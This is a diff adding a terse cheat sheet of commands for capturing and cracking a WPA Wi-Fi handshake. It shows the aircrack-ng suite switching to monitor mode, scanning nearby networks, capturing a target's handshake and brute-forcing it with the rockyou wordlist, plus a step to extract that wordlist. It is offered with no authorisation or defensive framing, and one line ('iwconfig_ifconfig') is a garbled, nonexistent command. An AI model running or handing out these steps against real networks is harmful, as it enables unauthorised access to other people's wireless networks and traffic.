@@ -1,0 +1,27 @@
+        (Wifi Adapter Must)
+sudo su -
+iwconfig_ifconfig       // Check Wifi Adapters && Start Monitor Mode
+airmon-ng start wlan0 (Monitor Mode Enabled)
+iwconfig_ifconfig (Check wlan0mon)
+airodump-ng wlan0mon (Ctrl C)  // Scan Nearby Networks
+airodump-ng -c <channel> --bssid  <MAC> -w handshake wlan0mon  // Capture Handshake (Password Hash)
+ls
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <MAC> Handshake      //Crack Password
+
+
+
+              (New Tab)
+
+sudo su -
+cd /usr/share/wordlists
+ls
+gzip -d rockyou.txt.gz   // Extract File (.gz)
+
+
+
+
+
+
+
+
+
